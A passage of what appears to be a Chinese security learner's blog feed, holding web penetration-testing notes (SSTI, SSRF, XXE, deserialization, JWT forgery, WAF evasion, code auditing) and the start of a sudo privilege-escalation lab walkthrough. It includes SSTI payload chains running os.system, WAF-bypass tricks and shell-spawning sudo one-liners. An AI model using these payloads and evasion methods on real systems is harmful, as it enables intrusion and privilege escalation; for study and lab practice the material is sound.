title="安全修复"></a>安全修复</h5><ul><li>httponly</li><li>输入过滤</li><li>输出过滤</li></ul><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h3><h5 id="出现位置"><a href="#出现位置" class="headerlink" title="出现位置"></a>出现位置</h5><ul><li>有xss的地方，尝试执行表达式或计算式，能给出结果</li></ul><h5 id="漏洞成因"><a href="#漏洞成因" class="headerlink" title="漏洞成因"></a>漏洞成因</h5><ul><li>模板注入，利用web模板如jinja2,tomado,Django来处理网页交互，用户的输入可以直接添加到页面内容</li></ul><h5 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h5><ul><li><p>php中一般可以直接执行命令</p></li><li><p>python中构造链，一般由 <code>&quot;&quot;.__class__</code> 起手，不断寻找父类或子类来实现文件读写，最后的链一般如下所示</p><figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sqf">().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__bases__</span>[<span class="hljs-number">0</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__base__</span>.<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">68</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br>().<span class="hljs-variable">__class__</span>.<span class="hljs-variable">__mro__</span>[<span class="hljs-number">1</span>].<span class="hljs-variable">__subclasses__</span>()[<span class="hljs-number">73</span>].<span class="hljs-variable">__init__</span>.<span class="hljs-variable">__globals__</span>[<span class="hljs-string">&#x27;os&#x27;</span>].system(<span class="hljs-string">&#x27;whoami&#x27;</span>)<br></code></pre></td></tr></table></figure></li></ul><h3 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h3><ul><li>请求伪造</li><li>抓数据包测试</li><li>伪造服务器点击 执行js脚本</li><li>burp生成poc</li></ul><h5 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h5><ul><li>随机token</li><li>同源策略referer</li></ul><h3 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h3><ul><li>通过网站服务器做跳板请求内网地址</li></ul><h5 id="出现点"><a href="#出现点" class="headerlink" title="出现点"></a>出现点</h5><ul><li>分享：通过URL地址分享网页内容</li><li>转码服务（通过URL地址把原地址的网页内容调优，使其适合手机屏幕的浏览）</li><li>在线翻译</li><li>图片加载与下载：通过URL地址加载或下载图片</li><li>图片、文章收藏功能</li><li>未公开的api实现及调用URL的功能</li><li>从URL关键字中寻找</li></ul><h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><ul><li>可以对外网、内网、本地进行端口扫描，某些情况下端口的Banner会回显出来（比如3306的）；</li><li>攻击运行在内网或本地的有漏洞程序（比如溢出）；</li><li>可以对内网Web应用进行指纹识别，原理是通过请求默认的文件得到特定的指纹；</li><li>攻击内网或外网有漏洞的Web应用；</li><li>使用file：&#x2F;&#x2F;&#x2F;协议读取本地文件(或其他协议）</li></ul><h3 id="RCE代码及系统命令执行漏洞"><a href="#RCE代码及系统命令执行漏洞" class="headerlink" title="RCE代码及系统命令执行漏洞"></a>RCE代码及系统命令执行漏洞</h3><h5 id="判断系统"><a href="#判断系统" class="headerlink" title="判断系统"></a>判断系统</h5><ul><li>linux</li><li>windows</li></ul><h5 id="可能产生点"><a href="#可能产生点" class="headerlink" title="可能产生点"></a>可能产生点</h5><ul><li>web源码</li><li>中间件</li><li>其他环境</li></ul><h5 id="检测"><a href="#检测" class="headerlink" title="检测"></a>检测</h5><ul><li>白盒 【代码审计】</li><li>黑盒 【漏扫工具 公开漏洞 手工看参数或功能点】</li></ul><h5 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h5><ul><li>waf</li><li>敏感函数禁用</li><li>变量过滤</li></ul><h3 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含<a id="文件包含漏洞"></a></h4><h5 id="本地包含"><a href="#本地包含" class="headerlink" title="本地包含"></a>本地包含</h5><ul><li>直接包含</li><li>后缀截断%00</li><li>垃圾数据截断&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.&#x2F;.</li><li>可结合文件上传</li><li>⚠filter链实现rce</li></ul><h5 id="远程包含"><a href="#远程包含" class="headerlink" title="远程包含"></a>远程包含</h5><ul><li>直接在自己网站放后门文件 -&gt; 远程包含后门文件 -&gt; 菜刀 蚁剑链接</li><li>截断</li></ul><h5 id="伪协议流包含"><a href="#伪协议流包含" class="headerlink" title="伪协议流包含"></a><a href="#PHP%E4%BC%AA%E5%8D%8F%E8%AE%AE">伪协议流包含</a></h5><h5 id="黑盒测试思路"><a href="#黑盒测试思路" class="headerlink" title="黑盒测试思路"></a>黑盒测试思路</h5><ul><li>cms漏洞&#x2F;源码分析</li><li>漏扫工具</li></ul><h4 id="文件下载"><a href="#文件下载" class="headerlink" title="文件下载"></a>文件下载</h4><h5 id="找漏洞"><a href="#找漏洞" class="headerlink" title="找漏洞"></a>找漏洞</h5><ul><li>参数值</li><li>功能点</li><li>漏扫工具</li></ul><h5 id="得到目录"><a href="#得到目录" class="headerlink" title="得到目录"></a>得到目录</h5><ul><li>目录扫描工具</li><li>根据可见文件分析</li></ul><h5 id="防过滤"><a href="#防过滤" class="headerlink" title="防过滤"></a>防过滤</h5><ul><li>..&#x2F;..&#x2F;</li><li>%20 %00</li></ul><h3 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h3><h5 id="nginx目录穿越"><a href="#nginx目录穿越" class="headerlink" title="nginx目录穿越"></a>nginx目录穿越</h5><ul><li>配置别名时出现疏忽</li><li>如配置<code>/etc/download/</code>的别名为<code>/file/ -&gt; /file</code>忘记&#x2F;导致目录穿越</li><li>利用 <code>/file../</code>可跳转到上层目录 <code>/etc/download/../</code> 即 <code>/etc</code></li></ul><h5 id="java-WEB"><a href="#java-WEB" class="headerlink" title="java WEB"></a>java WEB</h5><ul><li>webinf&#x2F;web.xml 存放信息</li><li>参数用POST传递</li><li><a href="https://blog.csdn.net/Mrs_H/article/details/119576821">WEB-INF&#x2F;web.xml泄露漏洞及其利用</a></li></ul><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><ul><li>一般借助类的某些方法辅助实现</li><li>结合RCE(代码执行)等漏洞使用</li></ul><h5 id="php反序列化"><a href="#php反序列化" class="headerlink" title="php反序列化"></a>php反序列化</h5><ul><li>将对象转换成字符串(序列化)<code>serialize()</code></li><li>反序列化<code>unserialize()</code></li><li>类对象序列化再反序列化时会调用苏醒函数<code>__wakeup()</code></li><li>创建类时调用构造函数<code>__construct()</code></li><li>类对象被echo或当作字符串操作时会调用<code>__toString()</code></li></ul><h5 id="pop链"><a href="#pop链" class="headerlink" title="pop链"></a>pop链</h5><ul><li>有多个类，他们的魔术方法可以起到不同作用，此时需要分析入口和出口函数，不断地构建对象，对象的属性互为其他对象，以此来达到链式调用的结果</li></ul><h5 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h5><ul><li>如果函数里没有 <code>unserialize</code> 函数，但是又存在反序列化漏洞或可以构造pop链，就可以尝试利用phar来进行反序列化，原理为phar格式的压缩包数据内容为序列化格式存储，在利用某些函数调用phar格式的文件时，会自动进行反序列化</li></ul><h5 id="php反序列化字节逃逸"><a href="#php反序列化字节逃逸" class="headerlink" title="php反序列化字节逃逸"></a>php反序列化字节逃逸</h5><ul><li>常存在于存在过滤的情况，由于序列化后的数据内容中值的长度是由数字唯一确定的，，那么进行长度不对等的过滤替换后，会在在原来的序列传中截取出新的串，从而实现我们想要执行的某些结果(比如控制一些无法控制的值)</li></ul><h5 id="java反序列化"><a href="#java反序列化" class="headerlink" title="java反序列化"></a>java反序列化</h5><ul><li><p>工具<code>ysoserial</code></p><h6 id="检测-1"><a href="#检测-1" class="headerlink" title="检测"></a>检测</h6><ul><li>黑盒看参数 以<code>rO0AB(base64) 或 aced(base16)</code> 开头</li><li>白盒找<code>readobject() writeobject</code></li></ul></li><li><p>利用 反弹shell RCE 弹计算器(bushi)</p></li></ul><h3 id="XXE"><a href="#XXE" class="headerlink" title="XXE"></a>XXE</h3><p><code>xml external entity injection </code>xml外部实体注入漏洞</p><h4 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h4><ul><li>文件读取</li><li>代码执行</li><li>内网攻击</li><li>DOS攻击</li></ul><h4 id="检测-2"><a href="#检测-2" class="headerlink" title="检测"></a>检测</h4><h5 id="白盒"><a href="#白盒" class="headerlink" title="白盒"></a>白盒</h5><ul><li>函数及可控变量查找</li><li>传输和储存数据格式类型</li></ul><h5 id="黑盒"><a href="#黑盒" class="headerlink" title="黑盒"></a>黑盒</h5><ul><li>更改content-Type 为 application&#x2F;xml 看是否接受</li></ul><h4 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h4><h5 id="有回显"><a href="#有回显" class="headerlink" title="有回显"></a>有回显</h5><ul><li>协议 <code>http file</code></li><li>引入外部实体</li></ul><h5 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h5><ul><li>读取指定内容 base64编码后 赋值给<code>file</code></li><li>访问远程地址的 <code>test.dtd</code>文件</li><li>test.dtd 内写有 带参数<code>?data=%file</code> 访问自己的网站</li><li>查看网站的日志得到  file 内容</li></ul><h4 id="实战-vulnhub-xxe"><a href="#实战-vulnhub-xxe" class="headerlink" title="实战(vulnhub&#x2F;xxe)"></a>实战(vulnhub&#x2F;xxe)</h4><ul><li>下载镜像文件</li><li>打开发现需要登陆密码</li><li>用主机开nmap扫到80端口</li><li>进去看到ubuntu欢迎界面</li><li>dirsearch扫目录得到rebots.txt</li><li>rebots.txt里看到&#x2F;xxe目录</li><li>访问&#x2F;xxe 看到登录框</li><li>任意文件读取读到&#x2F;xxe&#x2F;admin.php源码</li><li>从源码中得到账号密码登录</li><li>得到flag网址(假) 打不开</li><li>任意文件读取假的flag网址得到base32字符串</li><li>base32 base64解码得到真正的flag地址 &#x2F;etc&#x2F;.flag</li><li>base64解码 得到一串混淆过的php源码</li><li>在线运行 报错 得到flag</li></ul><h4 id="防御-1"><a href="#防御-1" class="headerlink" title="防御"></a>防御</h4><ul><li>禁用外部实体</li><li>过滤用户提交的xml数据</li><li>装waf</li></ul><h3 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h3><h4 id="原型链污染"><a href="#原型链污染" class="headerlink" title="原型链污染"></a>原型链污染</h4><h5 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h5><ul><li>javascript类&#x2F;对象存在一个<strong>原型对象</strong>，构造函数的 <code>prototype</code> 就等于实例化对象的 <code>__proto__</code> ，也就是说，修改一个对象的 <code>__proto__</code> 的属性，就会修改这个对象的原型对象的属性</li><li>javascript对象的属性具有<strong>向上继承</strong>的特性，如果一个对象并不具有某个属性，那么在调用这个属性的时候便会向<strong>原型对象</strong>的属性去寻找，<strong>依次往上</strong>直到找到属性或null</li><li>利用以上两点，便可以实现以下功能：修改 a 对象的<strong>原型对象</strong>，使 b 对象的某个属性值发生变化，即<strong>如果攻击者控制并修改了一个对象的原型，那么将可以影响所有和这个对象来自同一个类、父祖类的对象。这种攻击方式就是原型链污染。</strong></li></ul><h5 id="利用前提"><a href="#利用前提" class="headerlink" title="利用前提"></a>利用前提</h5><ul><li>存在不安全的对象递归合并(merge)</li></ul><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><ul><li>newstar2023 week3 okjigirl</li></ul><h2 id="逻辑问题"><a href="#逻辑问题" class="headerlink" title="逻辑问题"></a>逻辑问题</h2><h3 id="业务逻辑"><a href="#业务逻辑" class="headerlink" title="业务逻辑"></a>业务逻辑</h3><h4 id="逻辑越权"><a href="#逻辑越权" class="headerlink" title="逻辑越权"></a>逻辑越权</h4><h5 id="水平越权"><a href="#水平越权" class="headerlink" title="水平越权"></a>水平越权</h5><ul><li>依赖于数据包 查看、修改同级别用户的信息</li></ul><h5 id="垂直越权"><a href="#垂直越权" class="headerlink" title="垂直越权"></a>垂直越权</h5><ul><li>下载源码或自行构造管理员命令数据包</li><li>使用普通用户的身份证明替换管理员身份证明 仍然可以执行管理员功能</li></ul><h4 id="产生原因"><a href="#产生原因" class="headerlink" title="产生原因"></a>产生原因</h4><h5 id="前端验证"><a href="#前端验证" class="headerlink" title="前端验证"></a>前端验证</h5><ul><li>身份不同只有看到的代码不同，实现功能的部分没有做验证</li></ul><h4 id="工具使用-1"><a href="#工具使用-1" class="headerlink" title="工具使用"></a>工具使用</h4><ul><li>中通检测工具</li><li>secson-check</li><li>burp插件 authz</li></ul><h4 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h4><ul><li>前后端同时验证</li><li>每个功能点都验证权限</li><li>加密</li><li>过滤参数</li></ul><h3 id="登录脆弱"><a href="#登录脆弱" class="headerlink" title="登录脆弱"></a>登录脆弱</h3><h4 id="账号密码爆破"><a href="#账号密码爆破" class="headerlink" title="账号密码爆破"></a>账号密码爆破</h4><ul><li>明文传输</li><li>加密传输</li></ul><h4 id="cookie脆弱"><a href="#cookie脆弱" class="headerlink" title="cookie脆弱"></a>cookie脆弱</h4><ul><li>源码审计</li><li>手动看登陆后的cookie</li></ul><h3 id="数据篡改-支付漏洞"><a href="#数据篡改-支付漏洞" class="headerlink" title="数据篡改(支付漏洞)"></a>数据篡改(支付漏洞)</h3><h4 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h4><ul><li>订单号</li><li>商品数量、单价</li><li>支付接口</li><li>支付状态</li></ul><h4 id="常见修改方法"><a href="#常见修改方法" class="headerlink" title="常见修改方法"></a>常见修改方法</h4><ul><li>替换支付</li><li>重复支付</li><li>最小额支付</li><li>负数支付</li><li>溢出支付</li><li>优惠券支付</li></ul><h3 id="找回绕过"><a href="#找回绕过" class="headerlink" title="找回绕过"></a>找回绕过</h3><h4 id="验证和操作不同时"><a href="#验证和操作不同时" class="headerlink" title="验证和操作不同时"></a>验证和操作不同时</h4><ul><li>直接操作绕过验证</li></ul><h4 id="前端验证-1"><a href="#前端验证-1" class="headerlink" title="前端验证"></a>前端验证</h4><ul><li>burp抓返回包 修改返回值</li><li>后端验证则无效</li></ul><h3 id="token-验证码"><a href="#token-验证码" class="headerlink" title="token 验证码"></a>token 验证码</h3><h4 id="验证码安全"><a href="#验证码安全" class="headerlink" title="验证码安全"></a>验证码安全</h4><ul><li>客户端回显(数据包直接能看到)</li><li>验证码复用</li><li>验证码爆破(工具 pkavhttpfuzzer 插件 reCAPTCHA captcha-killer)</li><li>绕过</li></ul><h4 id="token"><a href="#token" class="headerlink" title="token"></a>token</h4><ul><li>爆破(识别或猜测出加密方法)</li><li>回显(下一token在response中可以看到 利用burp正则匹配自动填写)</li></ul><h2 id="JAVA-安全"><a href="#JAVA-安全" class="headerlink" title="JAVA 安全"></a>JAVA 安全</h2><h4 id="javascript原型链污染"><a href="#javascript原型链污染" class="headerlink" title="javascript原型链污染"></a>javascript原型链污染</h4><h4 id="sql注入-1"><a href="#sql注入-1" class="headerlink" title="sql注入"></a>sql注入</h4><ul><li>session注入</li><li>利用预编译防止注入(解决大部分问题)</li><li>绕过预编译↑ <code>case when</code> 要求 数据按某项元素排序且改列名可控 <code>order by + column</code></li></ul><h3 id="JWT安全"><a href="#JWT安全" class="headerlink" title="JWT安全"></a>JWT安全</h3><h4 id="概念"><a href="#概念" class="headerlink" title="概念"></a>概念</h4><ul><li><a href="https://blog.csdn.net/weixin_50464560/article/details/120579337">JWT攻击手册(附jwt_tool用法,爆破弱密钥等)</a></li><li>json web token 跨域验证身份的方案</li><li>不加密传输的数据，但能通过数字签名来验证数据未被篡改、</li></ul><h4 id="组成"><a href="#组成" class="headerlink" title="组成"></a>组成</h4><ul><li>头(base64) 存储加密方式</li><li>声明(base64) 存储数据</li><li>签名(头部的加密方式结合密匙)</li></ul><h4 id="伪造"><a href="#伪造" class="headerlink" title="伪造"></a>伪造</h4><ul><li>有密匙的话直接解 无密匙往下走</li><li>直接将头部加密方式设为 none</li><li>失效时间改为靠后</li><li>删除签名部分</li><li>修改可能被url编码的符号<code>+变- /变_ =去掉</code></li></ul><h4 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h4><ul><li>拿到令牌token 解码出加密方式和声明内容</li><li>通过脚本完成以下内容</li><li>批量跑字典来通过指定的加密方式加密内容</li><li>比对得到的签名base64编码后和原始签名是否一致</li><li>当匹配到一致后则输出该密匙</li></ul><h3 id="其他漏洞的java形式"><a href="#其他漏洞的java形式" class="headerlink" title="其他漏洞的java形式"></a>其他漏洞的java形式</h3><h4 id="文件上传-1"><a href="#文件上传-1" class="headerlink" title="文件上传"></a>文件上传</h4><ul><li>任意目录覆盖上传</li><li>绕过目录解析，执行脚本</li></ul><h4 id="不安全登录"><a href="#不安全登录" class="headerlink" title="不安全登录"></a>不安全登录</h4><ul><li>账号密码可直接在js获得</li></ul><p>…</p><ul><li>⚠javaWeb的参数不以参数名识别，只与传参顺序有关</li></ul><h4 id="app安全"><a href="#app安全" class="headerlink" title="app安全"></a>app安全</h4><ul><li>一键反编译</li><li>漏了个大洞</li></ul><h2 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h2><h3 id="系统漏洞"><a href="#系统漏洞" class="headerlink" title="系统漏洞"></a>系统漏洞</h3><h4 id="探针工具"><a href="#探针工具" class="headerlink" title="探针工具"></a>探针工具</h4><ul><li><p>Goby(界面友好，快速)[<a href="https://gobies.org]">https://gobies.org]</a></p></li><li><p>Nmap(支持自定义插件)</p><h5 id="Nessus"><a href="#Nessus" class="headerlink" title="Nessus"></a>Nessus</h5><ul><li>全面 高效 </li><li>需要自行开启Tanable Nessus服务后在浏览器端使用</li><li><a href="https://www.freebuf.com/sectool/350938.html">Nessus 离线破解更新插件教程</a></li></ul></li><li><p>OpenVAS</p></li><li><p>Nexpose</p></li></ul><h4 id="漏洞类型"><a href="#漏洞类型" class="headerlink" title="漏洞类型"></a>漏洞类型</h4><ul><li>远程代码执行</li><li>权限提升</li><li>缓冲区溢出</li><li>…</li></ul><h4 id="如何利用"><a href="#如何利用" class="headerlink" title="如何利用"></a>如何利用</h4><h5 id="工具框架"><a href="#工具框架" class="headerlink" title="工具框架"></a>工具框架</h5><ul><li>渗透测试工具Metasploit  -&gt; kali和忍者上装载的msfconsole</li><li>Searchsploit 漏洞查找工具</li><li>企业单位内部产品</li></ul><p>​一般利用searchsploit或者直接在探针工具上找到漏洞对应编号 利用msf进行测试</p><h5 id="单点Exp"><a href="#单点Exp" class="headerlink" title="单点Exp"></a>单点Exp</h5><ul><li>cmd</li><li>国内漏洞共享平台[<a href="https://www.cnvd.org.cn]">https://www.cnvd.org.cn]</a></li><li>知道创宇[<a href="https://www.seebug.org]">https://www.seebug.org]</a></li><li>1337day[<a href="https://mrxn.net/share/0day-today.html]">https://mrxn.net/share/0day-today.html]</a></li><li><a href="https://exploit-db.com/">https://exploit-db.com</a></li><li>Packetstorm Security</li></ul><h4 id="如何修复"><a href="#如何修复" class="headerlink" title="如何修复"></a>如何修复</h4><ul><li>打补丁</li><li>360 …</li><li>关闭入口</li><li>防护应用</li></ul><h3 id="web漏洞"><a href="#web漏洞" class="headerlink" title="web漏洞"></a>web漏洞</h3><h4 id="已知cms"><a href="#已知cms" class="headerlink" title="已知cms"></a>已知cms</h4><ul><li>如常见的dedecms.discuz,wordpress等源码结构，可利用公开的漏洞(vulhub,seebug…)进行测试，或者自行下载cms代码进行白盒审计</li></ul><h4 id="已知开发框架"><a href="#已知开发框架" class="headerlink" title="已知开发框架"></a>已知开发框架</h4><ul><li>如thinkphp, spring, flask等开发的源码程序，获取相应的框架信息，通过公共的安全问题进行测试，如果不存在则自行白盒审计</li></ul><h4 id="未知cms"><a href="#未知cms" class="headerlink" title="未知cms"></a>未知cms</h4><ul><li>可能是企业的或个人的内部程序源码，也可能是某cms二次开发的源码结构，针对此类源码程序，如果能识别出二次开发就按已知的cms思路进行，不能确定二次开发的话可以利用常规综合类扫描工具或脚本进行漏扫，也可以人工探针(功能点，参数，盲猜)，如果能拿到源码则进行白盒审计</li></ul><h5 id="漏扫工具"><a href="#漏扫工具" class="headerlink" title="漏扫工具"></a>漏扫工具</h5><ul><li><a href="https://blog.csdn.net/weixin_42248871/article/details/120981838">Xray简单使用</a></li><li><a href="https://zhuanlan.zhihu.com/p/384677028">AWVS下载、安装、使用教程</a></li><li>appscan</li></ul><h3 id="app漏洞"><a href="#app漏洞" class="headerlink" title="app漏洞"></a>app漏洞</h3><h4 id="抓包"><a href="#抓包" class="headerlink" title="抓包"></a>抓包</h4><h5 id="http-https"><a href="#http-https" class="headerlink" title="http&#x2F;https"></a>http&#x2F;https</h5><ul><li>burp</li><li>charles</li><li>fiddler</li><li>抓包精灵</li></ul><h5 id="其他协议"><a href="#其他协议" class="headerlink" title="其他协议"></a>其他协议</h5><ul><li>wireshark</li></ul><h5 id="burp＋xray"><a href="#burp＋xray" class="headerlink" title="burp＋xray"></a>burp＋xray</h5><p>利用burp抓包转发到本机端口(6666) xray监听本机6666端口被动扫描</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">xray<span class="hljs-selector-class">.exe</span> webscan <span class="hljs-attr">--listen</span> <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">6666</span><br></code></pre></td></tr></table></figure><h4 id="逆向分析"><a href="#逆向分析" class="headerlink" title="逆向分析"></a>逆向分析</h4><ul><li>漏了个大洞</li><li>一键反编译</li></ul><h3 id="服务协议"><a href="#服务协议" class="headerlink" title="服务协议"></a>服务协议</h3><h4 id="端口服务"><a href="#端口服务" class="headerlink" title="端口服务"></a>端口服务</h4><ul><li>web服务类</li><li>数据库类</li><li>大数据类</li><li>文件共享</li><li>远程访问</li><li>邮件服务</li><li>其他服务</li></ul><h4 id="弱口令爆破"><a href="#弱口令爆破" class="headerlink" title="弱口令爆破"></a>弱口令爆破</h4><ul><li>基于网页的可利用burp爆破</li><li>基于协议(ssh,mysql等)的弱口令爆破可利用工具</li></ul><h4 id="api接口"><a href="#api接口" class="headerlink" title="api接口"></a>api接口</h4><ul><li>部分网站调用接口api(如WSDL)可利用漏扫工具扫描</li></ul><h2 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h2><p><a href="http://ping.chinaz.com/">http://ping.chinaz.com/</a></p><h4 id="反爬虫延时代理池"><a href="#反爬虫延时代理池" class="headerlink" title="反爬虫延时代理池"></a>反爬虫延时代理池</h4><ul><li>延时爬取</li><li>百度等爬虫头</li><li>付费代理池</li></ul><h4 id="代理池指纹被动探针"><a href="#代理池指纹被动探针" class="headerlink" title="代理池指纹被动探针"></a>代理池指纹被动探针</h4><p><strong>扫描工具的指纹(如ua或者一些payload) 容易被waf记录并识别 此时可以采用一些方法来进行绕过</strong></p><ul><li>代理池 Proxy_pool (搭过 免费的极不好用  建议充钱)</li><li>延时 被动扫描  </li><li>payload绕过</li></ul><h5 id="工具之间的联动"><a href="#工具之间的联动" class="headerlink" title="工具之间的联动"></a>工具之间的联动</h5><ul><li>使用awvs(初次扫描，控制速度) + burp(查看发包速度和数据) + xray(二次扫描)</li><li>xray无法控制延时和UA 所以用awvs控制  两次扫描可以一定程度上避免payload识别拦截</li></ul><h4 id="漏洞利用-可能被拦截的洞"><a href="#漏洞利用-可能被拦截的洞" class="headerlink" title="漏洞利用(可能被拦截的洞)"></a>漏洞利用(可能被拦截的洞)</h4><h5 id="sql注入-2"><a href="#sql注入-2" class="headerlink" title="sql注入"></a>sql注入</h5><ul><li>sqlmap  上代理过cc  UA爬虫头过工具指纹黑名单</li><li>自己编写tamper模块 绕各种payload拦截</li></ul><h5 id="文件上传-2"><a href="#文件上传-2" class="headerlink" title="文件上传"></a>文件上传</h5><ul><li><p>文件名回车截断</p><p><a href="#upload_waf">前文提到</a></p></li></ul><h5 id="xss跨站"><a href="#xss跨站" class="headerlink" title="xss跨站"></a>xss跨站</h5><ul><li><a href="#xss_bypass">xss_bypass</a></li><li>xsstrike(工具 可以配置代理和延时)</li></ul><h5 id="文件包含-1"><a href="#文件包含-1" class="headerlink" title="文件包含"></a><a href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E">文件包含</a></h5><h5 id="RCE执行"><a href="#RCE执行" class="headerlink" title="RCE执行"></a>RCE执行</h5><ul><li>十六进制编码解码 利用assert()函数执行</li><li>str_replace 进行字符替换绕过黑名单</li><li>变量拆分组合 <code>$a=&quot;asse&quot;;$b=&quot;rt&quot;;$c=$a.$b;$c()</code></li><li>更改请求方式 <code>get post request</code></li></ul><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><h4 id="工具利用"><a href="#工具利用" class="headerlink" title="工具利用"></a>工具利用</h4><ul><li>使用fortify进行白盒审计(任意类型文件)</li><li>使用seay进行php审计</li></ul><h4 id="手工-脚本审计"><a href="#手工-脚本审计" class="headerlink" title="手工&#x2F;脚本审计"></a>手工&#x2F;脚本审计</h4><h5 id="关键字搜索"><a href="#关键字搜索" class="headerlink" title="关键字搜索"></a>关键字搜索</h5><ul><li>接受参数 <code>$_get</code> 之类的 和 输出类函数 如<code>echo</code></li><li>数据库操作关键词 <code>select</code> <code>insert</code> <code>update</code> <code>sql执行语句</code></li><li>命令执行关键词 <code>exec</code></li></ul><h5 id="功能点"><a href="#功能点" class="headerlink" title="功能点"></a>功能点</h5><ul><li>文件传输处(如会员中心)可能存在文件上传 文件读取 文件执行</li><li>登录框存在xss sql注入</li></ul><h5 id="断点调试"><a href="#断点调试" class="headerlink" title="断点调试"></a>断点调试</h5><ul><li>执行过程前后顺序</li><li>调用文件列表</li></ul><h4 id="php无框架sql注入"><a href="#php无框架sql注入" class="headerlink" title="php无框架sql注入"></a>php无框架sql注入</h4><ul><li><p>绕过魔术引号 宽字节注入 二次注入</p></li><li><p>php源码审计工具-&gt;数据库监控  看数据库交互</p></li><li><p><strong>74cms 二次注入 先insert再update 更新的时候语句被执行</strong></p></li><li><p>数据库监视脚本网页版(运行在web端)</p></li><li><p><strong>maccms源码</strong> get方式会识别url编码 可以用二次编码绕过强制性的编码替换</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>学习</tag>
      
      <tag>笔记</tag>
      
      <tag>渗透测试</tag>
      
      <tag>知识点</tag>
      
      <tag>小迪公开课</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>hacksudoLPE</title>
    <link href="/2023/11/26/hacksudoLPE/"/>
    <url>/2023/11/26/hacksudoLPE/</url>
    
    <content type="html"><![CDATA[<h2 id="challenge-1"><a href="#challenge-1" class="headerlink" title="challenge 1"></a>challenge 1</h2><p>sudo提权，共有30关</p><p><img src="/2023/11/26/hacksudoLPE/image-20231001144703604.png" alt="image-20231001144703604"></p><p>各指令提权<a href="https://gtfobins.github.io/">https://gtfobins.github.io/</a></p><h3 id="apt-get提权"><a href="#apt-get提权" class="headerlink" title="apt-get提权"></a>apt-get提权</h3><ul><li><p>sudo -l 查看可执行文件，发现可以apt-get</p></li><li><p>执行以下命令提权</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sudo apt-<span class="hljs-built_in">get</span> changelog apt<br>!/bin/sh<br><span class="hljs-comment"># viluhacker</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001144538488.png" alt="image-20231001144538488"></p></li></ul><h3 id="arp越权读文件"><a href="#arp越权读文件" class="headerlink" title="arp越权读文件"></a>arp越权读文件</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-attribute">f</span>=file_to_read<br>sudo arp -v -f <span class="hljs-string">&quot;<span class="hljs-variable">$f</span>&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001145509793.png" alt="image-20231001145509793"></p><h3 id="awk提权"><a href="#awk提权" class="headerlink" title="awk提权"></a>awk提权</h3><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">sudo awk <span class="hljs-symbol">&#x27;BEGIN</span> &#123;system(<span class="hljs-string">&quot;/bin/sh&quot;</span>)&#125;&#x27;<br></code></pre></td></tr></table></figure><p><img src="/2023/11/26/hacksudoLPE/image-20231001193142947.png" alt="image-20231001193142947"></p><h3 id="base32"><a href="#base32" 